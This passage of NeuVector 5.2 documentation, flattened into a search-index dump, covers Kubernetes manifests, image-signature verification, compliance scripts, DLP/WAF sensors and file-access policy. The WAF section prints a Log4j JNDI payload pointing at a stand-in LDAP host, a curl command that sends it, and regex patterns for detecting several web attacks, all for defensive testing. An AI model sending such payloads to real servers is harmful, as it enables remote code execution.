true terminationGracePeriodSeconds: 1200 restartPolicy: Always volumes: - name: modules-vol hostPath: path: /lib/modules - name: runtime-sock hostPath: path: /run/containerd/containerd.sock - name: proc-vol hostPath: path: /proc - name: cgroup-vol hostPath: path: /sys/fs/cgroup --- apiVersion: apps/v1 kind: Deployment metadata: name: neuvector-scanner-pod namespace: neuvector spec: selector: matchLabels: app: neuvector-scanner-pod strategy: type: RollingUpdate rollingUpdate: maxSurge: 1 maxUnavailable: 0 replicas: 2 template: metadata: labels: app: neuvector-scanner-pod spec: containers: - name: neuvector-scanner-pod image: neuvector/scanner imagePullPolicy: Always env: - name: CLUSTER_JOIN_ADDR value: neuvector-svc-controller.neuvector restartPolicy: Always --- apiVersion: batch/v1 kind: CronJob metadata: name: neuvector-updater-pod namespace: neuvector spec: schedule: &quot;0 0 * * *&quot; jobTemplate: spec: template: metadata: labels: app: neuvector-updater-pod spec: containers: - name: neuvector-updater-pod image: neuvector/updater imagePullPolicy: Always command: - /bin/sh - -c - TOKEN=`cat /var/run/secrets/kubernetes.io/serviceaccount/token`; /usr/bin/curl -kv -X PATCH -H &quot;Authorization:Bearer $TOKEN&quot; -H &quot;Content-Type:application/strategic-merge-patch+json&quot; -d '{&quot;spec&quot;:{&quot;template&quot;:{&quot;metadata&quot;:{&quot;annotations&quot;:{&quot;kubectl.kubernetes.io/restartedAt&quot;:&quot;'`date +%Y-%m-%dT%H:%M:%S%z`'&quot;}}}}}' 'https://kubernetes.default/apis/apps/v1/namespaces/neuvector/deployments/neuvector-scanner-pod' restartPolicy: Never   Docker Run-time  If using the docker run-time instead of containerd, the volumeMounts for controller and enforcer pods in the sample yamls change to:   - mountPath: /var/run/docker.sock name: docker-sock readOnly: true   And the volumes change from runtime.sock to:   - name: docker-sock hostPath: path: /var/run/docker.sock   Or for the AWS Bottlerocket OS with containerd:   volumeMounts: ... - mountPath: /run/containerd/containerd.sock name: docker-sock readOnly: true ... volumes: ... - name: docker-sock hostPath: path: /run/dockershim.sock ...   PKS Change  note PKS is field tested and requires enabling privileged containers to the plan/tile, and changing the yaml hostPath as follows for Allinone, Controller, Enforcer: hostPath: path: /var/vcap/sys/run/docker/docker.sock  ","version":"5.2","tagName":"h3"},{"title":"Sigstore Cosign Signature Verifiers","type":0,"sectionRef":"#","url":"/5.2/policy/admission/sigstore","content":"","keywords":"","version":"5.2"},{"title":"Configuring Sigstore/Cosign Verifiers for Requiring Image Signing​","type":1,"pageTitle":"Sigstore Cosign Signature Verifiers","url":"/5.2/policy/admission/sigstore#configuring-sigstorecosign-verifiers-for-requiring-image-signing","content":" NeuVector enables a user to perform signature verification logic by integrating image signatures generated by Sigstore's cosign tool.  The following is an example of an admission control configuration that requires a deployment's image be signed by an appropriate key or identity.  First, configure a root of trust. This can either be a public or private root of trust, depending on the Sigstore deployment used to generate signatures. If you have deployed your own instances of Sigstore's services, select the private root of trust option.  A public root of trust does not need any additional configuration outside of giving it an easily referenced name.    A private root of trust requires the the keys and/or certificates from your privately deployed instances of Sigstore's services.    Next, for a given root of trust, configure each of the verifiers that you would like to use during admission control. There are two types of verifiers: keypair and keyless. A keypair verifier would be used when trying to verify an image signed by a user-defined private key. A keyless verifier would be used when verifying a signature generated by Sigstore's keyless pattern. More information about the Sigstore signing methods can be seen here.  To configure a keypair verifier, provide a name, and a public key corresponding to a target private key.    To configure a keyless verifier, provide the OIDC issuer and identity used during signing.    Note that after root-of-trust and verifier configuration, an image must be scanned in order to determine which verifiers the given image's signatures satisfy.  The configured verifiers that an image satisfies can be viewed in the upper right section of a given image's scan results in Assets-&gt;Registries. If an image is not signed by a verifier, it will not appear in its scan results.    To reference a particular root of trust and verifier in an admission control rule, join the two names with a forward slash like so: my-root-of-trust/my-verifier.    To require an image be signed in an admission control rule, set the True/False value for the Image Signed criteria.   ","version":"5.2","tagName":"h3"},{"title":"Custom Compliance Checks","type":0,"sectionRef":"#","url":"/5.2/policy/customcompliance","content":"","keywords":"","version":"5.2"},{"title":"Creating Custom Scripts for Compliance Checks​","type":1,"pageTitle":"Custom Compliance Checks","url":"/5.2/policy/customcompliance#creating-custom-scripts-for-compliance-checks","content":" Custom scripts can be run on containers and hosts for use in compliance checks and other assessments. The Custom Compliance check is a bash script that can be run on any container to validate a condition and report result in the container or node compliance section.  note The ability to create custom scripts is disabled by default to protect against misuse. This can be enabled be setting the CUSTOM_CHECK_CONTROL environment variable in the Controller and Enforcer. Values are &quot;disable&quot; (default, not allowed), &quot;strict&quot; (admin role only), or &quot;loose&quot; (admin, compliance, and runtime-policy roles).  caution Custom scripts should be used with extreme caution. The custom script can run any executable in the container namespace with container privilege. Executables can be very destructive, such as rm, format, fdisk etc. This caution applies to hosts/nodes as well. Custom check scripts on hosts can be even more destructive if they can access the master node in the cluster.  A custom script is controlled by the run-time policy permission with namespaced RBAC; users should setup the Kubernetes user roles properly.Custom scripts are run with the same privilege as the running container.The compliance result is removed once a custom script is deleted.Custom Compliance checks need to follow a format in order to report the result correctly in the compliance report for the container or node. Script starts with 'if' statement to check some conditionCustom check is pass if exit code is 0Custom check is fail if exit code is 1  Sample script to check if container has root account with no password.​  if [ $(cat /etc/shadow | grep 'root:::0:::::') ]; then DESCRIPTION=&quot;CVE-2019-5021 fails.&quot; echo $DESCRIPTION; exit 1; else echo &quot;CVE-2019-5021 pass&quot;; exit 0; fi   Sample script to check dirty cow file in the container.​  if [ $(find . / | grep -w 'cow') ]; then DESCRIPTION=&quot;dirty cow seen in the container&quot; echo $DESCRIPTION; exit 1; else echo &quot;no dirty cow found pass&quot;; exit 0; fi   Other Notes  Scripts have a timeout of 1 minute to complete, otherwise they are killed and reported as an error in the compliance result.Script can be executed when in all 3-operating modes, Discover, Monitor, and Protect.  ","version":"5.2","tagName":"h3"},{"title":"Creating a custom check script​","type":1,"pageTitle":"Custom Compliance Checks","url":"/5.2/policy/customcompliance#creating-a-custom-check-script","content":" Select the service group (user created or auto learned) from Policy -&gt; Group.Click custom check tab.Enter name of the script. Spaces are not allowed.Copy and paste script to script section.Click ADD button to add script.Multiple scripts can be created and managed from the option provided in the right side corner.Scripts are run on the containers covered by the service group as soon as script is created as well as when the script is updated.View the script result from Assets -&gt; Container -&gt; Compliance, or Assets -&gt; Nodes -&gt; Compliance.  Samples​  Creating a custom check script on demo group comprised of 3 containers    Showing compliance results for nginx container, which has a dirty cow file, so a warning is reported.    Showing compliance result for nodejs container, which does not have a dirty cow file, so a pass is reported from the script.    Showing compliance result for nginx container for a custom check that had a timeout.    ","version":"5.2","tagName":"h3"},{"title":"Creating a response rule for compliance report​","type":1,"pageTitle":"Custom Compliance Checks","url":"/5.2/policy/customcompliance#creating-a-response-rule-for-compliance-report","content":" Response rules can be created in Policy -&gt; Response Rules that are based on results of custom compliance check results. The results are part of the category Compliance, and responses can be created for all events of a certain level.  Choose category complianceType service group name in group option and choose desired group from auto select optionType level and choose level:Warning from auto select optionEnable desired actions Quarantine, webhook and/or suppress logEnable status buttonClick Add button to add the response rule  The next compliance event with result warning will trigger the corresponding response rule action.    Create a response rule for compliance report and custom check script by name:  Choose category complianceType service group name in the group option and choose the desired group from drop down options, or leave the group name blank to apply to allType 'n' and choose custom check script name from the drop down menu of optionsEnable desired actions Quarantine, webhook and/or suppress logEnable status buttonClick Add button to add the response rule  The next compliance event with warning will trigger the corresponding response rule action.   ","version":"5.2","tagName":"h3"},{"title":"DLP & WAF Sensors","type":0,"sectionRef":"#","url":"/5.2/policy/dlp","content":"","keywords":"","version":"5.2"},{"title":"Data Loss Prevention (DLP) and Web Application Firewall (WAF)​","type":1,"pageTitle":"DLP & WAF Sensors","url":"/5.2/policy/dlp#data-loss-prevention-dlp-and-web-application-firewall-waf","content":" DLP and WAF uses the Deep Packet Inspection (DPI) of NeuVector to inspect the network payloads of connections for sensitive data violations. NeuVector uses a regular expression (regex) based engine to perform packet filtering functions. Extreme care should be taken when applying sensors to container traffic, as the filtering function incurs additional system overhead and can impact performance of the host.  DLP and WAF filtering are applied differently depending on the group(s) to which they are applied. In general, WAF filtering is applied to inbound and outbound connections except for internal traffic where only inbound filtering is applied. DLP filtering applies to inbound and outbound connections from a 'security domain', but not any internal connections within a security domain. See the detailed descriptions below.  Configuring DLP or WAF is a two step process:  Define and test the sensor(s), which is the set of regular expressions used to match the header, URL, or entire packet.Apply the desired sensor to a Group, in the Policy -&gt; Groups screen.  WAF Sensors​  WAF sensors represent inspection of network traffic to/from a pod/container. These sensors can be applied to any applicable group, even custom groups (e.g. namespace groups). Incoming traffic to ALL containers within the group will be inspected for WAF rule detection. In addition, any outbound (egress) connections external to the cluster will be inspected.  This means that, while this feature is named WAF, it is useful and applicable to any network traffic, not only web application traffic, and therefore provides broader protections than simple WAFs. For example, API security can be enforced on outbound connections to an external api service, allowing only GET requests and blocking POSTs.  Also note that, while similar to DLP, the inspection is for incoming traffic to EVERY pod/container within the group, while DLP applies inspection to incoming and outgoing traffic from the group only (i.e. the security boundary), not internal traffic in the group (e.g. not east-west within a Group's containers).    DLP Sensors​  DLP Sensors are the patterns that are used to inspect traffic. Built in sensors such as credit card and U.S. social security have predefined regular expressions. You can add custom sensors by defining regex patterns to be used in that sensor. Note that, while similar to WAF, DLP applies inspection to incoming and outgoing traffic from the group only (i.e. the security boundary), not internal traffic in the group (e.g. not east-west within a Group's containers). WAF inspection is for incoming traffic only to EVERY pod/container within the group.    Configuring DLP and WAF sensors​  The configuration of DLP and WAF sensors is similar. Create a sensor Name and any comment, then select the sensor to Add or Edit the rules for that sensor. Key fields include:  Have/Not Have. Determines if the match requires the pattern to be found (Have) in order to take the action (e.g. Deny), or only if the pattern does not exist (Not Have) should the action be taken. It is recommended that the &quot;Not Have&quot; operator be combined in the rule with a pattern using the &quot;Have&quot; operator because a single pattern with &quot;Not Have&quot; operator will not be effective.Pattern. This is the regular expression used to determine a match. You can test your regex against sample data to ensure correct Have/Not Have results.Context. Where to look for the pattern match. Choose packet for the broadest inspection of the entire network connection, or narrow the inspection to the URL, header, or body only.    Each DLP/WAF rule supports multiple patterns (max 16 patterns are allowed per rule). Multiple patterns as well as setting the rule context can also help reduce false positives.  Example of a DLP rule with a Have/Not Have pattern: Have:  \\b3[47]\\d{2}([ -]?)(?!(\\d)\\2{5}|123456|234567|345678)\\d{6}\\1(?!(\\d)\\3{4}|12345|56789)\\d{5}\\b   This produces a false positive match for &quot;istio_agent_go_gc_duration_seconds_sum 22.378386247999998&quot;:  docker exec -ti httpclient sh / # curl -d &quot;{\\&quot;context\\&quot;: \\&quot;istio_agent_go_gc_duration_seconds_sum 22.378386247999998\\&quot;}&quot; 172.17.0.5:8080/ Hello, world!   Adding a Not Have pattern removes the false positive:  istio\\_(\\w){5}   Sensors must be applied to a Group to become effective.  Applying DLP/WAF Sensors to Container Groups​  To activate a DLP or WAF sensor, go to Policy -&gt; Groups to select the group desired. Enable DLP/WAF for the Group and add the sensor(s).  It is recommended that DLP sensors be applied to the boundary of a security zone, defined by a Group, to minimize the impact of DLP inspection. If needed, define a Custom Group that represents such a security zone. For example, if the Group selected is the reserved group 'containers', and DLP sensors added to the group, only traffic in or out of the cluster and not between all containers will be inspected. Or if it is a custom group defined as 'namespace=demo' then only traffic in or out of the namespace demo will be inspected, and not any inter-container traffic within the namespace.  It is recommended that WAF sensors be applied only to Groups where incoming (e.g. ingress) connections are expected, unless the sensor(s) apply to specific internal applications (expecting east-west traffic).    DLP/WAF Behavior Summary  DLP pattern matching does not occur for the traffic which is passing among workloads that belong to same DLP group.Any traffic passing in and out of a DLP group is scanned for pattern matches.Cluster ingress and egress traffic is scanned for patterns if the workload is allowed to make ingress/egress connections.Multiple patterns per DLP/WAF rule (max 16 patterns are allowed per rule).Multiple alerts are generated for a single packet if it matches multiple rules.For performance reasons, only the first 16 rules are alerted and matched even if the packet matches more than 16 rules.Alerts are aggregated and reported together if same rule matches and alerts multiple times within 2 seconds.PCRE is used for pattern matching.Hyper scan library is used for efficient, scalable and high-performance pattern matching.  DLP/WAF Actions in Discover, Monitor, Protect Modes​  When adding sensors to groups, the DLP/WAF action can be set to Alert or Deny, with the following behavior if there is a match:  Discover mode. The action will always be to alert, regardless of the setting Alert/Deny.Monitor mode. The action will always be to alert, regardless of the setting Alert/Deny.Protect mode. The action will be to alert if set to Alert, or block if set to Deny.  Log4j Detection WAF Pattern​  The WAF-like rule to detect the Log4j attempted exploit is below. Please note this should only be applied to Groups expecting ingress web connections.  \\$\\{((\\$|\\{|\\s|lower|upper|\\:|\\-|\\})*[jJ](\\$|\\{|\\s|lower|upper|\\:|\\-|\\})*[nN](\\$|\\{|\\s|lower|upper|\\:|\\-|\\})*[dD](\\$|\\{|\\s|lower|upper|\\:|\\-|\\})*[iI])((\\$|\\{|\\s|lower|upper|\\:|\\-|\\})|[ldapLDAPrmiRMIdnsDNShttpHTTP])*\\:\\/\\/.*   Also note that there are ways that attackers could bypass detection by such rules.  Testing the Log4j WAF Detection​  In an attempted exploit, the attacker will construct an initial jndi: insertion and include it in the User-Agent HTTP Header:  User-Agent: ${jndi:ldap://enq0u7nftpr.m.example.com:80/cf-198-41-223-33.cloudflare.com.gu}   Using curl to POST data to server(container) can help to test WAF rule:  curl -X POST -k -H &quot;X-Auth-Token: $_TOKEN_&quot; -H &quot;Content-Type: application/json&quot; -H &quot;User-Agent: ${jndi:ldap://enq0u7nftpr.m.example.com:80/cf-198-41-223-33.cloudflare.com.gu}&quot; -d '$SOME_DATA' &quot;http://$SOME_IP_:$PORT&quot;   WAF Setup and Testing​  The downloadable file below provides an unsupported script for creating WAF sensors via CRD and running common WAF rule tests against those sensors. The README provides instructions for running it.  Download WAF test script  Sample Alerts​  DLP match in Discover or Monitor Mode    DLP match in Protect Mode    DLP Security Event Notification for Credit Card Match    note The automated packet capture will contain the actual packet including the credit card number matched. This is also true of any DLP packet capture for any sensitive data.  ","version":"5.2","tagName":"h3"},{"title":"Managing WAF Rules Using Import/Export or CRDs​","type":1,"pageTitle":"DLP & WAF Sensors","url":"/5.2/policy/dlp#managing-waf-rules-using-importexport-or-crds","content":" It is possible to import or export WAF rules from the WAF screen. This can be useful to be able to propagate rules to other clusters, make a backup, or prepare them for applying as a CRD.  In order to create WAF sensors or apply a WAF sensor to a group using CRDs, make sure the appropriate NVWafSecurityRule cluster role binding is created.  Sample WAF sensor CRD  apiVersion: v1 items: - apiVersion: neuvector.com/v1 kind: NvWafSecurityRule metadata: name: sensor.execution spec: sensor: comment: arbitrary command execution attempt name: sensor.execution rules: - name: Alchemy patterns: - context: url key: pattern op: regex value: \\/NUL\\/.*\\.\\.\\/\\.\\.\\/ - name: Log4j patterns: - context: header key: pattern op: regex value: \\$\\{((\\$|\\{|\\s|lower|upper|\\:|\\-|\\})*[jJ](\\$|\\{|\\s|lower|upper|\\:|\\-|\\})*[nN](\\$|\\{|\\s|lower|upper|\\:|\\-|\\})*[dD](\\$|\\{|\\s|lower|upper|\\:|\\-|\\})*[iI])((\\$|\\{|\\s|lower|upper|\\:|\\-|\\})|[ldapLDAPrmiRMIdnsDNShttpHTTP])*\\:\\/\\/.* - name: formmail patterns: - context: url key: pattern op: regex value: \\/formmail - context: packet key: pattern op: regex value: \\x0a - name: CCBill patterns: - context: url key: pattern op: regex value: \\/whereami\\.cgi?.*g= - name: DotNetNuke patterns: - context: url key: pattern op: regex value: \\/Install\\/InstallWizard.aspx.*executeinstall - name: HNAP patterns: - context: url key: pattern op: regex value: \\/tmUnblock.cgi - context: header key: pattern op: regex value: 'Authorization: Basic\\s*YWRtaW46' - name: Magento patterns: - context: url key: pattern op: regex value: \\/Adminhtml_.*forwarded= - name: b2 patterns: - context: url key: pattern op: regex value: \\/b2\\/b2-include\\/.*b2inc.*http\\x3a\\/\\/ - name: bat patterns: - context: url key: pattern op: regex value: x2ebat\\x22.*?\\x26 - name: eshop.pl patterns: - context: url key: pattern op: regex value: \\/eshop\\.pl?.*seite=\\x3b - name: whois_raw.cgi patterns: - context: url key: pattern op: regex value: \\/whois_raw\\.cgi? - context: packet key: pattern op: regex value: \\x0a kind: List metadata: null   Sample CRD to apply a WAF sensor to a Group  apiVersion: v1 items: - apiVersion: neuvector.com/v1 kind: NvSecurityRule metadata: name: demo-group namespace: demo spec: egress: [] file: [] ingress: [] process: [] process_profile: baseline: default target: policymode: N/A selector: comment: &quot;&quot; criteria: - key: domain op: = value: demo - key: service op: = value: nginx-pod.demo - key: service op: = value: node-pod.demo name: demo-group original_name: &quot;&quot; waf: settings: - action: deny name: sensor.cross - action: deny name: sensor.execution - action: deny name: sensor.injection - action: deny name: sensor.traversal - action: deny name: wafsensor-1 status: true kind: List metadata: null   See the CRD section for more details on working with CRDs.  ","version":"5.2","tagName":"h3"},{"title":"DLP/WAF Response Rules​","type":1,"pageTitle":"DLP & WAF Sensors","url":"/5.2/policy/dlp#dlpwaf-response-rules","content":" Response rules based on DLP/WAF security events can be created in Policy -&gt;Response Rules. Start type DLP or WAF and the dropdown will list all sensors and patterns available to create rules.    ","version":"5.2","tagName":"h3"},{"title":"Adding WAF CRD Support to Previous NeuVector Deployments​","type":1,"pageTitle":"DLP & WAF Sensors","url":"/5.2/policy/dlp#adding-waf-crd-support-to-previous-neuvector-deployments","content":" Delete old neuvector-binding-customresourcedefinition clusterrole  kubectl delete clusterrole neuvector-binding-customresourcedefinition   Apply new update verb for neuvector-binding-customresourcedefinition clusterrole  kubectl create clusterrole neuvector-binding-customresourcedefinition --verb=watch,create,get,update --resource=customresourcedefinitions   Delete old crd schema for Kubernetes 1.19+  kubectl delete -f https://raw.githubusercontent.com/neuvector/manifests/main/kubernetes/crd-k8s-1.19.yaml   Create new crd schema for Kubernetes 1.19+  kubectl apply -f https://raw.githubusercontent.com/neuvector/manifests/main/kubernetes/5.2.0/crd-k8s-1.19.yaml kubectl apply -f https://raw.githubusercontent.com/neuvector/manifests/main/kubernetes/5.2.0/waf-crd-k8s-1.19.yaml   Create a new neuvector-binding-nvwafsecurityrules clusterrole and clusterrolebinding  kubectl create clusterrole neuvector-binding-nvwafsecurityrules --verb=list,delete --resource=nvwafsecurityrules kubectl create clusterrolebinding neuvector-binding-nvwafsecurityrules --clusterrole=neuvector-binding-nvwafsecurityrules --serviceaccount=neuvector:default  ","version":"5.2","tagName":"h3"},{"title":"File Access Rules","type":0,"sectionRef":"#","url":"/5.2/policy/filerules","content":"","keywords":"","version":"5.2"},{"title":"Policy: File Access Rules​","type":1,"pageTitle":"File Access Rules","url":"/5.2/policy/filerules#policy-file-access-rules","content":" There are two types of Process/File protections in NeuVector. One is Zero-drift, where allowed process and file activity are automatically determined based on the container image, and second is a behavioral learning based. Each can be customized (rules added manually) if desired.  NeuVector has built-in detection of suspicious file system activity. Sensitive files in containers normally do not change at run-time. By modifying the content of the sensitive files, an attacker can gain unauthorized privileges, such as in the Dirty-Cow linux kernel attack, or damage the system’s integrity, for example by manipulating the /etc/hosts file. Most containers don't run in read-only mode. Any suspicious activity in containers, hosts, or the NeuVector Enforcer container itself will be detected and logged into Notifications -&gt; Security Events.  Zero-drift File Protection​  This is the default mode for process and file protections. Zero-drift automatically allows only processes which originate from the parent process that is in the original container image, and does not allow file updates or new files to be installed. When in Discover or Monitor mode, zero-drift will alert on any suspicious process or file activity. In Protect mode, it will block such activity. Zero-drift does not require file activity to be added to an allow-list. Disabling zero-drift for a group will cause the process and file rules listed for the group to take effect instead.  note The process/file rules listed for each group are always applied, even when zero-drift is enabled. This offers a way to add allow/deny exceptions to the base zero-drift protections. Keep in mind that if a group starts in Discover mode, process/file rules can be automatically added to the list, and should be reviewed and edited before moving to Monitor/Protect modes.  The ability to enable/disable zero-drift mode is in the console in Policy -&gt; Groups. Multiple groups can be selected to toggle this setting for all selected groups.  Basic File Protections​  If a package installation is detected, an automatic re-scan of the container or host will be triggered to detect any vulnerabilities, IF auto-scan has been enabled in Security Risks -&gt; Vulnerabilities.  In addition to monitoring predefined files/directories, users can add custom files/directories to be monitored, and block such files/directories from being modified.  important NeuVector alerts, and does not block modifications to predefined files/directories or in system containers such as Kubernetes ones. Blocking is only an option for user configured custom files/directories for non-system containers. This is so that regular updates of system folder or sensitive configurations are not blocked unintentionally, resulting in erratic system behavior.  The following files and directories are monitored by default:  Executable filesSensitive setuid/setgid filesSystem libraries, libc, pthread, ...Package installation, Debian/Ubuntu, RedHat/CentOS, AlpineSensitive system files, /etc/passwd, /etc/hosts, /etc/resolv.conf …Running processes' executable files  The following activities are monitored:  Files, directories, symlinks (hard link and soft link)created, deleted, modified (content change) and moved  Below is a list of the file system monitoring and what is monitored (container, host/node, and/or NeuVector enforcer container itself):  /bin, /usr/bin, /usr/sbin, /usr/local/bin - container, enforcerFiles of setuid and setgid attribute - container, host, enforcerLibraries: libc, pthread, ld-linux.* - container, host, enforcerPackage installation: dpkg, rpm, apk - container, host, enforcer/etc/hosts, /etc/passwd, /etc/resolv.conf - container, host, enforcerBinaries of the running processes - container  Behavioral-learning based Allowed Applications in Discover Mode​  When in Discover mode, NeuVector can learn and whitelist applications ONLY for specified directories or files. To enable learning, a custom rule must be created and the Action must be set to Block, as described below.  Creating Custom File/Directory Monitoring Rules​  Custom file access rules can be created for both custom user-defined Groups as well as auto-learned Groups.  Users can add new entries for file/directory rules.  Filter: Configure the file/folder to be protected (wildcards are supported)Set the recursive flag (if all files in the subdirectories are to be protected)Select the action, Monitor or Block (see Actions below)Enter allowed applications (see Note1 below)    Actions:  Monitor file changes. Generate alerts (Notifications) for any changesBlock unauthorized access. Service in Discover mode: the file access behavior is learned (the processes/applications that access the protected file) and added to the Allowed Applications.Service in Monitor mode: unexpected file behavior is alerted.Service in Protect mode: unexpected access (read, modify) is blocked. New file creation in protected folders will be blocked as well.  note If the rule is set to Block, and the service is in Discover mode, NeuVector will learn the applications accessing the file and add these to the Allowed Applications for the rule.  note Container platforms running the AUFS storage driver will not support the deny (block) action in Protect mode for creating/modifying files due to the limitations of the driver. The behavior will be the same a Monitor mode, alerting upon suspicious activity.  File access rule order precedence​  A container can inherit file access rule from multiple custom groups and user created file access rule on auto learned group.  File access rules are prioritized in the order below if the file name conflicts with predefined access rules of auto learned group and rules inheritance of multiple groups.  File access rule with block access (highest order)File access rule with recursive enabledFile access rule with recursive disableUser created file access rule other than predefined file access rules  Examples​  Showing file access rule to protect /etc/hostname file of node-pod service and allow vi application to modify the file.    Showing file access rule to protect files under /var/opt/ directory recursively for modification as well reading. The Allowed Application python can have read and modify access to these files.    Showing access rule that protects file /etc/passwd, which is one of the files covered predefined access rule in order to modify the file access action, for modification as well reading. This custom rule changes the default action of the predefined file access rule. The application Nano can have 'read and modify' access to these files. Must also add the Nano application (process) as an 'allow' rule in the process profile rule for this service to run Nano application inside the service (if it wasn't already whitelisted there), otherwise the process will be blocked by NeuVector.    Showing that the application python was learned accessing file under /var/opt directory when service mode of node-pod was in Discover. This occurs only when the rule is set to Block and the service is in Discover mode.    Showing predefined file access rules for the service node-pod.demo-nvqa. This can be viewed for this service by clicking the info icon “show predefined filters” in the right corner of the file access rule tab.    Showing a sample security event in Notifications -&gt; Security Events, alerted as File access denial when modification of the file /etc/hostname by the application python was denied due to a custom file access rule with block action.    Other Responses​  If other special mitigations, responses, or alerts are desired for File System Violations, a Response Rule can be created. See the example below and the section Run-Time Security Policy -&gt; Response Rules for more details.    ","version":"5.2","tagName":"h3"},{"title":"Split Mode File Protections​","type":1,"pageTitle":"File Access Rules","url":"/5.2/policy/filerules#split-mode-file-protections","content":" Container Groups can have Process/File rules in a different mode than Network rules, as described here. ","version":"5.2","tagName":"h3"},{"title":"Federated Policy","type":0,"sectionRef":"#","url":"/5.2/policy/federated","content":"","keywords":"","version":"5.2"},{"title":"Federated Policy​","type":1,"pageTitle":"Federated Policy","url":"/5.2/policy/federated#federated-policy","content":" After a Master cluster has been created, Federated rules can be created in the Master which are automatically propagated to each cluster. This is useful to create global rules that should be applied to each cluster, such as global network rules. Federated rules will appear in every cluster as read-only and can NOT be deleted or edited by the local admin of the cluster.  To configure Federated rules, click on Federated Policy in the upper right drop down menu. You will see tabs for Groups, Admission Control, Network Rules and other rules which can be federated. Select the tab and create a new Group or rule. In the sample below, two Federated groups have been created, which will be propagated to each cluster.    And the following Federated Network Rule has been created to allow access of SSL from the node demo pods to google.com.    After these rules and groups have been propagated to the remote cluster(s), they will appear as Federated rules and groups in the local cluster's console.    In the above example, the Federated rule is shown which is different than learned rules and 'user created' rules which were created in the local cluster. The user created rule 1 can be selected for editing or deletion while the Federated can not. In addition, Federated network rules will always show at the top of the list, thus taking precedence over other rules.  Other rules such as Admission Control, Response, Process and File will behave in the same way, except that the order of rules is only relevant for the Network rules.  Note that the configuration of Process and File rules requires the selection of a Federated Group, as these must be applied to a target group as defined in the Federated Group tab. After a new Group has been configured in Federated -&gt; Groups, it will show as a selectable option when configuring a group in Process or File rules. ","version":"5.2","tagName":"h3"},{"title":"Modes: Discover, Monitor, Protect","type":0,"sectionRef":"#","url":"/5.2/policy/modes","content":"","keywords":"","version":"5.2"},{"title":"NeuVector Modes​","type":1,"pageTitle":"Modes: Discover, Monitor, Protect","url":"/5.2/policy/modes#neuvector-modes","content":" The NeuVector Violation Detection module has three modes: Discover, Monitor, and Protect. At any point in time, any Group (beginning with 'nv', or the 'Nodes' group) can be in any of these modes. The mode can be switched from the Groups menu, Network Activity view, or the Dashboard. Container Groups can have Process/File rules in a different mode than Network rules, as described here.    note Custom created groups don't have a Protection mode. This is because they may contain containers from different underlying groups, each of which may be in a different mode, causing confusion about the behavior.  Discover​  By default, NeuVector starts in Discover mode. In this mode, NeuVector:  Discovers your container infrastructure, including containers, nodes, and hosts.Learns your applications and behaviors by observing conversations (network connections) between containers.Identifies separate services and applications running.Automatically builds a whitelist of Network Rules to protect normal application network behavior.Baselines the processes running in containers for each service and creates whitelist Process Profile Rules.  note To determine how long to run a service in Discover mode, run test traffic through the application and review all rules for completeness. Several hours should be sufficient, but some applications may require a few days to be fully exercised. When in doubt, switch to Monitor mode and check for violations, which can then be converted to whitelist rules before moving to Protect mode.  Monitor​  In Monitor mode NeuVector monitors conversations and detects run-time violations of your Security Policy. In this mode, no new rules are created by NeuVector, but rules can manually be added at any time.  When violations are detected, they are visible in the Network Activity map visually by a red line. Violations are also logged and displayed in the Notifications tab. Process profile rule and file access violations are logged into Notifications -&gt; Security Events.  In the Network map you can click on any conversation (green, yellow, red line) to display more details about the type of connection and protocol last monitored. You can also use the Search and Filter by Group buttons in the lower right to narrow the display of your containers.  Protect​  In Protect mode, NeuVector enforcers will block (deny) any network violations and attacks detected. Violations are shown in the Network map with a red ‘x’ in them, meaning they have been blocked. Unauthorized processes and file access will also be blocked in Protect mode. DLP sensors which match will block network connections.  ","version":"5.2","tagName":"h3"},{"title":"Switching Between Modes​","type":1,"pageTitle":"Modes: Discover, Monitor, Protect","url":"/5.2/policy/modes#switching-between-modes","content":" You can easily switch NeuVector Groups from one mode to another. Remember that in Discover mode, NeuVector is building a Security Policy for allowed, normal container behavior. You can see these rules in the Policy -&gt; Groups tab or in detail in the Policy -&gt; Network Rules menu.  When you switch from Discover to Monitor mode, NeuVector will flag all violations of normal behavior not explicitly allowed. Because NeuVector enforces policy based on applications and groups with similar attributes, it’s typically not necessary to add or edit rules when scaling up or scaling down containers.  Please ensure that, before introducing new updates that result in new types of connections between containers, you switch the affected Service(s) to Discover mode to learn these new behaviors. Alternatively, you can manually add new rules while in any mode, or edit the CRD used to create the rules to add new behaviors.  New Service Mode​  If new services are discovered by NeuVector, for example a previously unknown container starts running, it can be set to a default mode. In Discover mode, NeuVector will start to learn its behavior and build Rules. In Monitor, a violation will be generated when connections to the new service are detected. In Protect, all connections to the new service will be blocked unless the rules have been created prior.    Network Service Policy Mode​  There is a global setting available in Settings -&gt; Configuration to separately set the network protection mode for enforcement of network rules. Enabling this (default is disabled), causes all network rules to be in the protection mode selected (Discover, Monitor, Protect), while process/file rules remain in the protection mode for that Group, as displayed in the Policy -&gt; Groups screen. In this way, network rules can be set to Protect (blocking), while process/file policy can be set to Monitor, or vice versa.  Automated Promotion of Group Modes​  Promotes a Group’s protection Mode based on elapsed time and criteria. This automation does not apply to CRD created Groups. This features allows a new application to run in Discover for some time period, learning the behavior and NeuVector creating allow-list rules for Network and Process, then automatically moving to Monitor, then Protect mode.  The criterion for moving from Discover to Monitor mode is: elapsed time for learning all network and process activity of at least one live pod in the Group. For example, if this is set to 7 days, then 7 days after a running pod for the group is detected, the mode will be automatically promoted to Monitor.  The criterion for moving from Monitor to Protect mode is: there are no security events (network, process etc) for the timeframe set for the Group. For example, if this is set to 14 days, then if no violations (network, process, file) are triggered for 14 days (e.g. the quiet period), then the mode is automatically promoted to Protect. If there are no running pods in the group, the promotion will not occur.    Conflict Resolution Between Services In Different Modes​  For network connections between containers in different service groups, if their policy modes are different, the following table shows how the system resolves the conflicts.  Source\tDestination\tEffective ModeDiscover\tMonitor\tDiscover Discover\tProtect\tDiscover Monitor\tDiscover\tDiscover Monitor\tProtect\tMonitor Protect\tDiscover\tDiscover Protect\tMonitor\tMonitor  As you can see, the effective mode always defaults to the least restrictive policy mode.  note The above applies only for Network Rules ","version":"5.2","tagName":"h3"},{"title":"Groups","type":0,"sectionRef":"#","url":"/5.2/policy/groups","content":"","keywords":"","version":"5.2"},{"title":"Policy: Groups​","type":1,"pageTitle":"Groups","url":"/5.2/policy/groups#policy-groups","content":" This menu is the key area to view and manage security rules and customize Groups for use in rules. It is also used to switch modes of Groups between Discover, Monitor, and Protect. Container Groups can have Process/File rules in a different mode than Network rules, as described here. Please see the following individual sections for explanations of Custom Compliance Checks, Network Rules, Process and File Access Rules and DLP/WAF detection. Note: Network rules can be viewed in the Groups menu for any group, but must be edited separately in the Network Rules menu.  NeuVector automatically creates Groups from your 